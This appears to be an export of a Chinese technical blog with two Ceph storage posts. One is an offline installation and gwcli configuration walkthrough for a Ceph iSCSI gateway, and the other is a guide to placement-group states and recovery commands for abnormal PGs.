<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[zhoub@CentOS ceph-iscsi-rpms]$  cat requirement.txt</span><br><span class="line"><span class="meta prompt_">pyudev&gt;</span><span class="language-bash">=0.16.1</span></span><br><span class="line">Flask</span><br><span class="line">requests</span><br><span class="line">crypto</span><br><span class="line">netifaces</span><br><span class="line">urwid</span><br><span class="line">pyparsing</span><br><span class="line">cryptography</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -r ./requirement.txt</span><br></pre></td></tr></table></figure>

<p>离线安装包在<code>rpms/ceph-iscsi-rpms/pip_packages</code>中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[zhoub@CentOS pip_packages]$ ls -al</span><br><span class="line">总用量 5828</span><br><span class="line">drwxr-xr-x. 2 zhoub zhoub    4096 6月  19 16:10 .</span><br><span class="line">drwxr-xr-x. 9 zhoub zhoub    4096 6月  19 16:31 ..</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  101571 6月  19 16:10 asn1crypto-0.24.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  157119 6月  19 16:10 certifi-2019.6.16-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  415091 6月  19 16:10 cffi-1.12.3-cp27-cp27mu-manylinux1_x86_64.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  133356 6月  19 16:10 chardet-3.0.4-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   81299 6月  19 16:10 Click-7.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   18019 6月  19 16:10 crypto-1.4.1-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub 2288455 6月  19 16:10 cryptography-2.7-cp27-cp27mu-manylinux1_x86_64.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   12427 6月  19 16:10 enum34-1.1.6-py2-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   92053 6月  19 16:10 Flask-1.0.3-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   58594 6月  19 16:10 idna-2.8-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   18155 6月  19 16:10 ipaddress-1.0.22-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   16743 6月  19 16:10 itsdangerous-1.1.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  124883 6月  19 16:10 Jinja2-2.10.1-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   24348 6月  19 16:10 MarkupSafe-1.1.1-cp27-cp27mu-manylinux1_x86_64.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  590559 6月  19 16:10 Naked-0.1.31-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   31249 6月  19 16:10 netifaces-0.10.9-cp27-cp27mu-manylinux1_x86_64.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  158295 6月  19 16:10 pycparser-2.19.tar.gz</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   62288 6月  19 16:10 pyparsing-2.4.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   89469 6月  19 16:10 pyudev-0.21.0.tar.gz</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  274442 6月  19 16:10 PyYAML-5.1.1.tar.gz</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   57952 6月  19 16:10 requests-2.22.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub    4933 6月  19 16:10 shellescape-3.4.1-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub   10586 6月  19 16:10 six-1.12.0-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  150942 6月  19 16:10 urllib3-1.25.3-py2.py3-none-any.whl</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  604167 6月  19 16:10 urwid-2.0.1.tar.gz</span><br><span class="line">-rw-r--r--. 1 zhoub zhoub  327611 6月  19 16:10 Werkzeug-0.15.4-py2.py3-none-any.whl</span><br></pre></td></tr></table></figure>

<h4 id="安装依赖rpms"><a href="#安装依赖rpms" class="headerlink" title="安装依赖rpms"></a>安装依赖rpms</h4><p>rpm包在<code>rpms/ceph-iscsi-rpms/</code>目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum localinstall libnl3-3.2.28-4.el7.x86_64.rpm</span><br><span class="line">yum localinstall pyOpenSSL-0.13.1-4.el7.x86_64.rpm</span><br><span class="line">yum localinstall pyparsing-1.5.6-9.el7.noarch.rpm</span><br><span class="line">yum localinstall python-kmod-0.9-4.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h4 id="安装TCMU-RUNNER"><a href="#安装TCMU-RUNNER" class="headerlink" title="安装TCMU-RUNNER"></a>安装TCMU-RUNNER</h4><p>rpm包在<code>rpms/ceph-iscsi-rpms/tcmu-runner</code>目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd tcmu-runner</span><br><span class="line">yum localinstall *.rpm</span><br></pre></td></tr></table></figure>

<p>启动<code>tcmu-runner</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable tcmu-runner</span><br><span class="line">systemctl start tcmu-runner</span><br></pre></td></tr></table></figure>

<p>源码地址：<a href="https://github.com/open-iscsi/tcmu-runner">https://github.com/open-iscsi/tcmu-runner</a><br>commit：8d8e612e50b7787c57f32f59bba7def9bb06954b</p>
<h4 id="安装RTSLIB-FB"><a href="#安装RTSLIB-FB" class="headerlink" title="安装RTSLIB-FB"></a>安装RTSLIB-FB</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd rtslib-fb</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>源码地址：<a href="https://github.com/open-iscsi/rtslib-fb">https://github.com/open-iscsi/rtslib-fb</a><br>commit: 03d6c7813187cd141a3a08f4b7978190187d56c1</p>
<h4 id="安装CONFIGSHELL-FB"><a href="#安装CONFIGSHELL-FB" class="headerlink" title="安装CONFIGSHELL-FB"></a>安装CONFIGSHELL-FB</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd configshell-fb</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>源码地址：<a href="https://github.com/open-iscsi/configshell-fb">https://github.com/open-iscsi/configshell-fb</a><br>commit: 166ba97e36d7b53e7fa53d7853a8b9f5a509503c</p>
<h4 id="安装TARGETCLI-FB"><a href="#安装TARGETCLI-FB" class="headerlink" title="安装TARGETCLI-FB"></a>安装TARGETCLI-FB</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd targetcli-fb</span><br><span class="line">python setup.py install</span><br><span class="line">mkdir /etc/target</span><br><span class="line">mkdir /var/target</span><br></pre></td></tr></table></figure>

<p>源码地址：<a href="https://github.com/open-iscsi/targetcli-fb">https://github.com/open-iscsi/targetcli-fb</a><br>commit: 85031ad48b011f5626cd0a287749abcaa145277b</p>
<h4 id="安装CEPH-ISCSI"><a href="#安装CEPH-ISCSI" class="headerlink" title="安装CEPH-ISCSI"></a>安装CEPH-ISCSI</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ceph-iscsi</span><br><span class="line">python setup.py install --install-scripts=/usr/bin</span><br><span class="line">cp ./usr/lib/systemd/system/rbd-target-gw.service /lib/systemd/system/</span><br><span class="line">cp ./usr/lib/systemd/system/rbd-target-api.service /lib/systemd/system/</span><br></pre></td></tr></table></figure>

<p>启动<code>rbd-target-gw</code>和<code>rbd-target-api</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable rbd-target-gw</span><br><span class="line">systemctl enable rbd-target-api</span><br><span class="line">systemctl start rbd-target-gw</span><br><span class="line">systemctl start rbd-target-api</span><br></pre></td></tr></table></figure>

<p>源码地址：<a href="https://github.com/ceph/ceph-iscsi">https://github.com/ceph/ceph-iscsi</a><br>commit: c5ebf29e1a0caa2e4bef44370b40fe940b66aaad</p>
<h3 id="配置iscsi-gateway-cfg"><a href="#配置iscsi-gateway-cfg" class="headerlink" title="配置iscsi-gateway.cfg"></a>配置iscsi-gateway.cfg</h3><p>创建一个<code>/etc/ceph/iscsi-gateway.cfg</code>文件，在文件中增加如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[config]</span><br><span class="line"># Name of the Ceph storage cluster. A suitable Ceph configuration file allowing</span><br><span class="line"># access to the Ceph storage cluster from the gateway node is required, if not</span><br><span class="line"># colocated on an OSD node.</span><br><span class="line">cluster_name = ceph</span><br><span class="line"></span><br><span class="line"># Place a copy of the ceph cluster&#x27;s admin keyring in the gateway&#x27;s /etc/ceph</span><br><span class="line"># drectory and reference the filename here</span><br><span class="line">gateway_keyring = ceph.client.admin.keyring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># API settings.</span><br><span class="line"># The API supports a number of options that allow you to tailor it to your</span><br><span class="line"># local environment. If you want to run the API under https, you will need to</span><br><span class="line"># create cert/key files that are compatible for each iSCSI gateway node, that is</span><br><span class="line"># not locked to a specific node. SSL cert and key files *must* be called</span><br><span class="line"># &#x27;iscsi-gateway.crt&#x27; and &#x27;iscsi-gateway.key&#x27; and placed in the &#x27;/etc/ceph/&#x27; directory</span><br><span class="line"># on *each* gateway node. With the SSL files in place, you can use &#x27;api_secure = true&#x27;</span><br><span class="line"># to switch to https mode.</span><br><span class="line"></span><br><span class="line"># To support the API, the bear minimum settings are:</span><br><span class="line">api_secure = false</span><br><span class="line"></span><br><span class="line"># Additional API configuration options are as follows, defaults shown.</span><br><span class="line"># api_user = admin</span><br><span class="line"># api_password = admin</span><br><span class="line"># api_port = 5001</span><br><span class="line"># iscsi-gw 最少需要部署两个服务</span><br><span class="line">trusted_ip_list = 10.53.2.13,10.53.2.16,10.53.2.19</span><br></pre></td></tr></table></figure>

<p>重启<code>rbd-target-api</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl stop rbd-target-api</span><br><span class="line">systemctl start rbd-target-api</span><br></pre></td></tr></table></figure>

<p>*** rbd-target-api 需要依赖 rbd pool，若集群中没有rbd pool ，需要手动创建。 ***</p>
<h3 id="配置iscsi-target"><a href="#配置iscsi-target" class="headerlink" title="配置iscsi-target"></a>配置iscsi-target</h3><p>在iscsi-gw服务所在节点上输入<code>gwcli</code>进入gw交互模式</p>
<h4 id="创建target-iqn"><a href="#创建target-iqn" class="headerlink" title="创建target iqn"></a>创建target iqn</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> /iscsi-target</span></span><br><span class="line"><span class="meta prompt_">/iscsi-target&gt; </span><span class="language-bash">create iqn.2019-08.com.hna.iscsi-gw:iscsi-igw</span></span><br></pre></td></tr></table></figure>

<h4 id="创建iscsi-gateway"><a href="#创建iscsi-gateway" class="headerlink" title="创建iscsi-gateway"></a>创建iscsi-gateway</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/iscsi-target&gt; </span><span class="language-bash"><span class="built_in">cd</span> iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/gateways</span></span><br><span class="line">/iscsi-target...-igw/gateways&gt;  create ceph13 10.53.2.13</span><br><span class="line">/iscsi-target...-igw/gateways&gt;  create ceph16 10.53.2.16</span><br><span class="line">/iscsi-target...-igw/gateways&gt;  create ceph19 10.53.2.19</span><br></pre></td></tr></table></figure>
<p>创建gateway时，输入的gateway名称为hostname, ip要与其对应上，并且在<code>/etc/hosts</code>文件中也要将<code>hostname</code>和<code>ip</code>对应上。</p>
<h4 id="创建rbd-image"><a href="#创建rbd-image" class="headerlink" title="创建rbd image"></a>创建rbd image</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/iscsi-target...-igw/gateways&gt; cd /disks</span><br><span class="line"><span class="meta prompt_">/disks&gt; </span><span class="language-bash">create pool=sata image=vol_sata_23t size=23T</span></span><br><span class="line"><span class="meta prompt_">/disks&gt; </span><span class="language-bash">create pool=ssd image=vol_ssd_1800g size=1800G</span></span><br></pre></td></tr></table></figure>

<h4 id="创建client-iqn"><a href="#创建client-iqn" class="headerlink" title="创建client iqn"></a>创建client iqn</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/disks&gt; </span><span class="language-bash"><span class="built_in">cd</span> /iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/</span></span><br><span class="line">/iscsi-target...csi-igw/hosts&gt;  create iqn.2019-08.com.example:2b14c50a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">/disks&gt; </span><span class="language-bash"><span class="built_in">cd</span> /iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/</span></span><br><span class="line">/iscsi-target...csi-igw/hosts&gt;  create iqn.2019-08.com.example:479172ae</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">/disks&gt; </span><span class="language-bash"><span class="built_in">cd</span> /iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/</span></span><br><span class="line">/iscsi-target...csi-igw/hosts&gt;  create iqn.2019-08.com.example:066f5c54</span><br></pre></td></tr></table></figure>

<p>设置chap用户名密码<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/iqn.2019-08.com.example:2b14c50a/</span></span><br><span class="line">/iscsi-target...mple:2b14c50a&gt; auth username=iqn.2019-08.com.example password=1qaz2wsx3edc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/iqn.2019-08.com.example:479172ae/</span></span><br><span class="line">/iscsi-target...mple:479172ae&gt; auth username=iqn.2019-08.com.example password=1qaz2wsx3edc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/hosts/iqn.2019-08.com.example:066f5c54/</span></span><br><span class="line">/iscsi-target...mple:066f5c54&gt; auth username=iqn.2019-08.com.example password=1qaz2wsx3edc</span><br></pre></td></tr></table></figure>

<h4 id="创建host-groups"><a href="#创建host-groups" class="headerlink" title="创建host-groups"></a>创建host-groups</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/host-groups/</span></span><br><span class="line">/iscsi-target...w/host-groups&gt; create xen</span><br></pre></td></tr></table></figure>

<h4 id="添加client-iqn"><a href="#添加client-iqn" class="headerlink" title="添加client iqn"></a>添加client iqn</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/host-groups/xen/</span></span><br><span class="line">/iscsi-target...st-groups/xen&gt; host add iqn.2019-08.com.example:066f5c54</span><br><span class="line">/iscsi-target...st-groups/xen&gt; host add iqn.2019-08.com.example:2b14c50a</span><br><span class="line">/iscsi-target...st-groups/xen&gt; host add iqn.2019-08.com.example:479172ae</span><br></pre></td></tr></table></figure>

<h4 id="添加rbd-image"><a href="#添加rbd-image" class="headerlink" title="添加rbd image"></a>添加rbd image</h4><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">cd</span> iscsi-targets/iqn.2019-08.com.hna.iscsi-gw:iscsi-igw/host-groups/xen/</span></span><br><span class="line">/iscsi-target...st-groups/xen&gt; disk add sata/vol_sata_23t</span><br><span class="line">/iscsi-target...st-groups/xen&gt; disk add ssd/vol_ssd_1800g</span><br></pre></td></tr></table></figure>

<p>至此iscsi-gw的搭建及配置完成，客户端可以通过iscsi协议访问ceph存储了。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">/&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">o- / ......................................................................................................................... [...]</span><br><span class="line">  o- cluster ......................................................................................................... [Clusters: 1]</span><br><span class="line">  | o- ceph ............................................................................................................ [HEALTH_OK]</span><br><span class="line">  |   o- pools .......................................................................................................... [Pools: 3]</span><br><span class="line">  |   | o- rbd ................................................................... [(x3), Commit: 0.00Y/21703946M (0%), Used: 6823b]</span><br><span class="line">  |   | o- sata ......................................................... [(x3), Commit: 23.0T/21703946M (111%), Used: 14325219841b]</span><br><span class="line">  |   | o- ssd ........................................................ [(x3), Commit: 1800G/1744741760K (108%), Used: 27569961653b]</span><br><span class="line">  |   o- topology ............................................................................................... [OSDs: 24,MONs: 3]</span><br><span class="line">  o- disks ...................................................................................................... [25352G, Disks: 2]</span><br><span class="line">  | o- sata ......................................................................................................... [sata (23.0T)]</span><br><span class="line">  | | o- vol_sata_23t .................................................................................. [sata/vol_sata_23t (23.0T)]</span><br><span class="line">  | o- ssd ........................................................................................................... [ssd (1800G)]</span><br><span class="line">  |   o- vol_ssd_1800g ................................................................................. [ssd/vol_ssd_1800g (1800G)]</span><br><span class="line">  o- iscsi-targets ............................................................................... [DiscoveryAuth: None, Targets: 1]</span><br><span class="line">    o- iqn.2019-08.com.hna.iscsi-gw:iscsi-igw ........................................................................ [Gateways: 3]</span><br><span class="line">      o- disks .......................................................................................................... [Disks: 2]</span><br><span class="line">      | o- sata/vol_sata_23t ....................................................................................... [Owner: ceph13]</span><br><span class="line">      | o- ssd/vol_ssd_1800g ....................................................................................... [Owner: ceph19]</span><br><span class="line">      o- gateways ............................................................................................ [Up: 3/3, Portals: 3]</span><br><span class="line">      | o- ceph13 ................................................................................................ [10.53.2.13 (UP)]</span><br><span class="line">      | o- ceph16 ................................................................................................ [10.53.2.16 (UP)]</span><br><span class="line">      | o- ceph19 ................................................................................................ [10.53.2.19 (UP)]</span><br><span class="line">      o- host-groups .................................................................................................. [Groups : 1]</span><br><span class="line">      | o- xen ................................................................................................ [Hosts: 3, Disks: 2]</span><br><span class="line">      |   o- iqn.2019-08.com.example:066f5c54 ............................................................................... [host]</span><br><span class="line">      |   o- iqn.2019-08.com.example:2b14c50a ............................................................................... [host]</span><br><span class="line">      |   o- iqn.2019-08.com.example:479172ae ............................................................................... [host]</span><br><span class="line">      |   o- sata/vol_sata_23t .............................................................................................. [disk]</span><br><span class="line">      |   o- ssd/vol_ssd_1800g .............................................................................................. [disk]</span><br><span class="line">      o- hosts .............................................................................................. [Hosts: 3: Auth: CHAP]</span><br><span class="line">        o- iqn.2019-08.com.example:2b14c50a .............................................. [LOGGED-IN, Auth: CHAP, Disks: 2(25352G)]</span><br><span class="line">        | o- lun 0 ....................................................................... [sata/vol_sata_23t(23.0T), Owner: ceph13]</span><br><span class="line">        | o- lun 1 ....................................................................... [ssd/vol_ssd_1800g(1800G), Owner: ceph19]</span><br><span class="line">        o- iqn.2019-08.com.example:479172ae .............................................. [LOGGED-IN, Auth: CHAP, Disks: 2(25352G)]</span><br><span class="line">        | o- lun 0 ....................................................................... [sata/vol_sata_23t(23.0T), Owner: ceph13]</span><br><span class="line">        | o- lun 1 ....................................................................... [ssd/vol_ssd_1800g(1800G), Owner: ceph19]</span><br><span class="line">        o- iqn.2019-08.com.example:066f5c54 .............................................. [LOGGED-IN, Auth: CHAP, Disks: 2(25352G)]</span><br><span class="line">          o- lun 0 ....................................................................... [sata/vol_sata_23t(23.0T), Owner: ceph13]</span><br><span class="line">          o- lun 1 ....................................................................... [ssd/vol_ssd_1800g(1800G), Owner: ceph19]</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://docs.ceph.com/docs/nautilus/start/quick-ceph-deploy/">ceph installation</a></li>
<li><a href="https://docs.ceph.com/docs/nautilus/rbd/iscsi-overview/">LIO iSCSI Gateway</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>异常PG处理套路</title>
    <url>/2019/06/14/storage/ceph/exception-pg-resolve-flow/</url>
    <content><![CDATA[<p>PG的全称为Placement Group（放置组），放置顾名思义放置Object的载体。PG的创建是在创建Pool的时候根据指定的数量进行创建。PG的数量与副本数也有关系，比如是3副本的则会有3个相同的pg存在于3个不同的osd上，以filestore为例pg其实在osd的存在形式就是一个目录。其目录的命名规则为 <code>&#123;pool-id&#125;.&#123;pg-id&#125;_head</code> 和 <code>&#123;pool-id&#125;.&#123;pg-id&#125;.TEMP</code>。如果你想找出一个pg对应哪些个osd，可以使用<code>ceph pg map &#123;pgid&#125;</code>的命令。</p>
<p>eg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph71 ~]# ceph pg map 1.5f</span><br><span class="line">osdmap e30 pg 1.5f (1.5f) -&gt; up [2,0,1] acting [2,0,1]</span><br></pre></td></tr></table></figure>

<p>背景就是介绍这么多吧，接下来说说PG状态。</p>
<h1 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h1><table>
<thead>
<tr>
<th align="right">状态</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="right">active</td>
<td align="left">当前拥有最新状态数据的pg正在工作中，能正常处理来自客户端的读写请求。</td>
</tr>
<tr>
<td align="right">inactive</td>
<td align="left">正在等待具有最新数据的OSD出现，即当前具有最新数据的pg不在工作中，不能正常处理来自客户端的读写请求。</td>
</tr>
<tr>
<td align="right">activating</td>
<td align="left">Peering 已经完成，PG 正在等待所有 PG 实例同步并固化 Peering 的结果 (Info、Log 等)</td>
</tr>
<tr>
<td align="right">clean</td>
<td align="left">pg所包含的object达到指定的副本数量，即object副本数量正常</td>
</tr>
<tr>
<td align="right">unclean</td>
<td align="left">PG所包含的object没有达到指定的副本数量，比如一个PG没在工作，另一个PG在工作，object没有复制到另外一个PG中。</td>
</tr>
<tr>
<td align="right">peering</td>
<td align="left">PG所在的OSD对PG中的对象的状态达成一个共识（维持对象一致性）</td>
</tr>
<tr>
<td align="right">peered</td>
<td align="left">peering已经完成，但pg当前acting set规模小于存储池规定的最小副本数（min_size）</td>
</tr>
<tr>
<td align="right">degraded</td>
<td align="left">主osd没有收到副osd的写完成应答，比如某个osd处于down状态</td>
</tr>
<tr>
<td align="right">stale</td>
<td align="left">主osd未在规定时间内向mon报告其pg状态，或者其它osd向mon报告该主osd无法通信</td>
</tr>
<tr>
<td align="right">inconsistent</td>
<td align="left">PG中存在某些对象的各个副本的数据不一致，原因可能是数据被修改</td>
</tr>
<tr>
<td align="right">incomplete</td>
<td align="left">peering过程中，由于无法选出权威日志，通过choose_acting选出的acting set不足以完成数据修复，导致peering无法正常完成</td>
</tr>
<tr>
<td align="right">repair</td>
<td align="left">pg在scrub过程中发现某些对象不一致，尝试自动修复</td>
</tr>
<tr>
<td align="right">undersized</td>
<td align="left">pg的副本数少于pg所在池所指定的副本数量，一般是由于osd down的缘故</td>
</tr>
<tr>
<td align="right">scrubbing</td>
<td align="left">pg对对象meta的一致性进行扫描</td>
</tr>
<tr>
<td align="right">deep</td>
<td align="left">pg对对象数据的一致性进行扫描</td>
</tr>
<tr>
<td align="right">creating</td>
<td align="left">pg正在被创建</td>
</tr>
<tr>
<td align="right">recovering</td>
<td align="left">pg间peering完成后，对pg中不一致的对象执行同步或修复，一般是osd down了或新加入了osd</td>
</tr>
<tr>
<td align="right">recovering-wait</td>
<td align="left">等待 Recovery 资源预留</td>
</tr>
<tr>
<td align="right">backfilling</td>
<td align="left">一般是当新的osd加入或移除掉了某个osd后，pg进行迁移或进行全量同步</td>
</tr>
<tr>
<td align="right">down</td>
<td align="left">包含必备数据的副本挂了，pg此时处理离线状态，不能正常处理来自客户端的读写请求</td>
</tr>
<tr>
<td align="right">remapped</td>
<td align="left">重新映射态。PG 活动集任何的一个改变，数据发生从老活动集到新活动集的迁移。在迁移期间还是用老的活动集中的主 OSD 处理客户端请求，一旦迁移完成新活动集中的主 OSD 开始处理</td>
</tr>
<tr>
<td align="right">misplaced</td>
<td align="left">有一些回填的场景：PG被临时映射到一个OSD上。而这种情况实际上不应太久，PG可能仍然处于临时位置而不是正确的位置。这种情况下个PG就是misplaced。这是因为正确的副本数存在但是有个别副本保存在错误的位置上。</td>
</tr>
</tbody></table>
<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><h2 id="active-undersized-degraded"><a href="#active-undersized-degraded" class="headerlink" title="active+undersized+degraded"></a>active+undersized+degraded</h2><p>若发现有osd挂掉，先尝试将osd重新拉起来，拉起来后集群会自动重新恢复健康状态。<br>但是也有可能出现这个osd再也起不来了，比如硬盘损坏了，这时多副本就发挥作用了，因为还有其它副本在其它osd上，这时我们可以通过均衡数据的方法来将集群恢复并将该osd踢出集群。</p>
<p>** 解决 **</p>
<ol>
<li>将osd reweight权重置0，将数据分散到其他osd上 <code>ceph osd reweight &#123;osd-id&#125; 0</code></li>
<li>待集群rebalance后，开始删除osd</li>
</ol>
<h2 id="unfound-objects"><a href="#unfound-objects" class="headerlink" title="unfound objects"></a>unfound objects</h2><p>ceph集群知道该对象存在，但无法定位该object在哪时会报这个错误。</p>
<p>** 解决 **</p>
<ol>
<li>尝试让失败的osd起来，如果起来后集群恢复正常，则结束</li>
<li>试将该pg的unfound对象回滚到上一个版本，<code>ceph pg &#123;pgid&#125; mark_unfound_lost revert</code>如果恢复正常，则结束</li>
<li>如果还是不行，那只有将该object删除掉了，注意这会导致丢失数据，执行<code>ceph pg &#123;pgid&#125; mark_unfound_lost delete</code>删除unfound对象</li>
</ol>
<h2 id="inconsistent-objects"><a href="#inconsistent-objects" class="headerlink" title="inconsistent objects"></a>inconsistent objects</h2><p>pg中保存的object中有些副本数据不一致，有些事伴随着scrub errors错误</p>
<p>** 解决 **</p>
<ol>
<li><code>ceph health detail</code>找出问题pg</li>
<li>尝试<code>ceph pg repair &#123;pgid&#125;</code>，若成功，则结束；不成功进行如下操作。</li>
<li>使用<code>ceph pg map &#123;pgid&#125;</code>找出主osd，打开日志查看哪个object不一致</li>
<li>找出所有该objects所有副本存放的位置，用摘要算法(md5sum,sha256)等计算出其hash值，如果是3副本，删除与其他副本不一致的；如果是2副本，则可能会误删。</li>
<li>再次执行<code>ceph pg repair &#123;pgid&#125;</code></li>
</ol>
<h2 id="stale-pg"><a href="#stale-pg" class="headerlink" title="stale pg"></a>stale pg</h2><p>pg出现stale状态，也就是pg处于僵死状态，该状态是无法处理新的请求了的，新的请求过来只会block，这种情况一般是由于所有副本pg的osd都挂了。<br>Ceph使用心跳来确保主机和进程都在运行，OSD进程如果不能周期性的发送心跳包，那么PG就会变成stuck状态。默认情况下，OSD每半秒钟汇汇报一次PG，up thru,boot, failure statistics等信息，要比心跳包更会频繁一点。如果主OSD不能汇报给MON或者其他OSD汇报主OSD挂了，Monitor会将主OSD上的PG标记为stale。当启动集群后，直到peer过程完成，PG都会处于stale状态。而当集群运行了一段时间后，如果PG卡在stale状态，说明主OSD上的PG挂了或者不能给MON发送信息。</p>
<p>要模拟其实也很简单，比如设置2副本，然后将2个不同故障域的osd挂掉即可出现，最好的恢复方法当然是重新拉起这两个osd，但有时可能出现这样的情况，两个osd永远也拉不起来了，然后你把这两个osd清理出去了，清理完后这些pg当然就是stale的状态，这时的恢复方法只能是丢掉这个pg里的数据了，重新创建pg。</p>
<p>** 解决 **</p>
<ol>
<li>使用命令<code>ceph pg dump |grep stale</code>找出所有的stale的pg，也可以<code>ceph health detail | grep stale</code></li>
<li>执行<code>ceph pg force_create_pg &#123;pgid&#125;</code>命令强制重新创建pg，会看到pg转为creating状态</li>
<li>重启ceph中所有osd服务</li>
</ol>
<h2 id="Peered"><a href="#Peered" class="headerlink" title="Peered"></a>Peered</h2><p>Peering 已经完成，但是 PG 当前 Acting Set 规模小于存储池规定的最小副本数 (min_size)。<br>如果pool的副本数为3、min_size&#x3D;2，停掉两个副本所在的osd，此时访问集群的客户端处于blocked状态。</p>
<p>** 解决 **</p>
<ol>
<li>先尝试将down掉的两个osd恢复，或至少恢复一个。</li>
<li>若不能正常恢复，可修改<code>min_size=1</code>，解除客户端blocked状态</li>
</ol>
<h1 id="鸣谢-参考"><a href="#鸣谢-参考" class="headerlink" title="鸣谢&amp;参考"></a>鸣谢&amp;参考</h1><ul>
<li><a href="https://www.cnblogs.com/luohaixian/p/9693978.html">Ceph PG介绍及故障状态和修复</a></li>
<li><a href="https://www.infoq.cn/article/4N2whf1y1lH_Hd5QYOkW">分布式存储系统 Ceph 之 PG 状态详解</a></li>
